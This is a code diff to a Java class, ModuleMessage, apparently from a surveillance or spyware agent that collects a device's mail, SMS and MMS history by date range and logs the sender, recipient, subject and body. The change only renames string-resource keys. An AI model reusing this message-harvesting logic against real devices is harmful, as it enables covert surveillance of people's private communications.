@@ -104,9 +104,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-			mailEnabled = readJson(ID_MAIL, Messages.getString("18.1"), conf, config);
-			smsEnabled = readJson(ID_SMS, Messages.getString("18.7"), conf, config);
-			mmsEnabled = readJson(ID_MMS, Messages.getString("18.9"), conf, config);
+			mailEnabled = readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
+			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);
 
 			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
 				// configMailChanged = true;
@@ -149,17 +149,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private boolean readJson(int id, String child, ConfModule jsonconf, String[] config) throws ConfigurationException {
 		ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
-		boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
+		boolean enabled = mailJson.getBoolean(Messages.getString("18_2")); //$NON-NLS-1$
 		String digestConfMail = child + "_" + enabled;
 
 		if (enabled) {
-			ChildConf filter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
-			boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+			ChildConf filter = mailJson.getChild(Messages.getString("18_3")); //$NON-NLS-1$
+			boolean history = filter.getBoolean(Messages.getString("18_4")); //$NON-NLS-1$
 			int maxSizeToLog = 4096;
 			digestConfMail += "_" + history;
 			if (history) {
-				Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-				Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
+				Date from = filter.getDate(Messages.getString("18_5")); //$NON-NLS-1$
+				Date to = filter.getDate(Messages.getString("18_6"), null); //$NON-NLS-1$
 				//sizeToLog = 
 
 				filterCollect[id] = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
@@ -348,8 +348,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 		final String address = mms.getAddress();
 		// MMS Subject:
-		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject() + "\n"
-				+ Messages.getString("10.4") + mms.getBody()); //$NON-NLS-1$
+		final byte[] subject = WChar.getBytes(Messages.getString("10_1") + mms.getSubject() + "\n"
+				+ Messages.getString("10_4") + mms.getBody()); //$NON-NLS-1$
 		final long date = mms.getDate();
 
 		final boolean sent = mms.getSent();
@@ -365,11 +365,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		if (sent) {
 			flags = 0;
-			from = Messages.getString("10.2"); //$NON-NLS-1$
+			from = Messages.getString("10_2"); //$NON-NLS-1$
 			to = address;
 		} else {
 			flags = 1;
-			to = Messages.getString("10.2"); //$NON-NLS-1$
+			to = Messages.getString("10_2"); //$NON-NLS-1$
 			from = address;
 		}
 
